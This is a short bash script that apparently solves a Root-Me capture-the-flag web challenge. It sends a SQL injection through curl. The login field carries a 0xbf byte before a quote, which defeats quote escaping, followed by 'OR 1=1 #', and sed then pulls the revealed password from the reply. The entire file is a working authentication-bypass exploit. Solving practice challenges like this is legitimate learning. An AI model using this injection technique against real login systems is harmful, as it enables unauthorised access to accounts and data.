#!/bin/bash
curl -s challenge01.root-me.org/web-serveur/ch42/index.php --data "login=$(echo -e "\xbf\x27") OR 1=1 #" --data-urlencode "password=1234" -Lc /tmp/cookie.txt | sed s/.*"password is:\s\(.*\)"/"\1"/
